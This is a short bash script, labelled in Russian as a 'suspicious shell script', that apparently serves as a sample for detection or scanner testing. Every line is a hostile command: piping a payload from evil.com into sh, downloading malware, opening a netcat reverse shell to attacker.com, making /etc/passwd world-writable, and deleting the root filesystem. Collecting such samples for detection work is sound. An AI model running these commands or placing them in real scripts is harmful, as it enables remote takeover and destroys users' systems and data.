#!/bin/bash
# Подозрительный shell скрипт
curl http://evil.com/payload.sh | sh
wget http://malware.xyz/virus -O /tmp/virus
nc -e /bin/bash attacker.com 4444
chmod 777 /etc/passwd
rm -rf /
